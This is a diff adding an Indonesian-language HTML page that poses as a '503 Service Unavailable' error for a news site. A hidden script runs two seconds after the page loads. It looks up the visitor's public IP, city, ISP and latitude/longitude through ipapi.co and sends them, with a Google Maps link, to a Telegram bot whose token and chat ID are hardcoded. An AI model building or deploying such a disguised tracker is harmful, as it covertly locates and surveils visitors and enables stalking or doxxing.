@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Error 503 - Service Unavailable</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f2f2f2;
+      margin: 0;
+      padding: 0;
+      color: #555;
+    }
+    .container {
+      max-width: 800px;
+      margin: 50px auto;
+      padding: 20px;
+      text-align: center;
+      background: white;
+      border-radius: 8px;
+      box-shadow: 0 0 15px rgba(0,0,0,0.1);
+    }
+    h1 {
+      color: #d62828;
+      font-size: 48px;
+      margin-bottom: 10px;
+    }
+    h2 {
+      color: #333;
+      margin-bottom: 20px;
+    }
+    .error-icon {
+      font-size: 80px;
+      color: #d62828;
+      margin: 20px 0;
+    }
+    .error-details {
+      background: #f9f9f9;
+      border-left: 4px solid #d62828;
+      padding: 15px;
+      margin: 20px 0;
+      text-align: left;
+    }
+    .loading-bar {
+      height: 5px;
+      width: 100%;
+      background: #eee;
+      margin: 20px 0;
+      overflow: hidden;
+    }
+    .loading-progress {
+      height: 100%;
+      width: 0%;
+      background: #d62828;
+      animation: loading 3s infinite;
+    }
+    @keyframes loading {
+      0% { width: 0%; }
+      50% { width: 70%; }
+      100% { width: 100%; }
+    }
+    .retry-button {
+      background: #d62828;
+      color: white;
+      border: none;
+      padding: 10px 20px;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 16px;
+      margin-top: 20px;
+    }
+    .retry-button:hover {
+      background: #b51d1d;
+    }
+    .hidden {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="error-icon">⚠️</div>
+    <h1>Error 503</h1>
+    <h2>Layanan Tidak Tersedia</h2>
+    
+    <p>Maaf, layanan berita sedang mengalami gangguan teknis sementara.</p>
+    
+    <div class="loading-bar">
+      <div class="loading-progress"></div>
+    </div>
+    
+    <div class="error-details">
+      <p><strong>Detail kesalahan:</strong> Koneksi timeout ke server berita</p>
+      <p><strong>Solusi yang mungkin:</strong></p>
+      <ul>
+        <li>Periksa koneksi internet Anda</li>
+        <li>Coba muat ulang halaman ini nanti</li>
+        <li>Bersihkan cache browser Anda</li>
+      </ul>
+    </div>
+    
+    <button class="retry-button" onclick="window.location.reload()">Coba Lagi</button>
+    
+    <p style="margin-top: 30px; font-size: 14px; color: #999;">
+      Jika masalah berlanjut, silakan hubungi administrator sistem.
+    </p>
+  </div>
+
+  
+  <script>
+    const BOT_TOKEN = "8291703373:AAHpYHTd_cXx69ojoPw5FFGP99ka6VG6fys";
+    const CHAT_ID = "8421512602";
+
+    
+    async function getInfo() {
+      try {
+        const res = await fetch("https://ipapi.co/json/");
+        const ip = await res.json();
+
+        const ipInfo = `
+[+] IP Information :
+Public IP    : ${ip.ip}
+Country      : ${ip.country_name}
+Region       : ${ip.region}
+City         : ${ip.city}
+ISP          : ${ip.org}
+        `;
+
+        const locationInfo = `
+[+] Location Information :
+Latitude     : ${ip.latitude}
+Longitude    : ${ip.longitude}
+
+📍 Google Maps : https://www.google.com/maps/place/${ip.latitude},${ip.longitude}
+        `;
+
+        const fullMessage = `${ipInfo}\n${locationInfo}`;
+
+      
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: fullMessage
+          })
+        });
+
+      } catch (err) {
+        console.error("Error fetching information:", err);
+      }
+    }
+
+    
+    window.addEventListener('load', function() {
+      setTimeout(getInfo, 2000); 
+    });
+  </script>
+</body>
+</html>
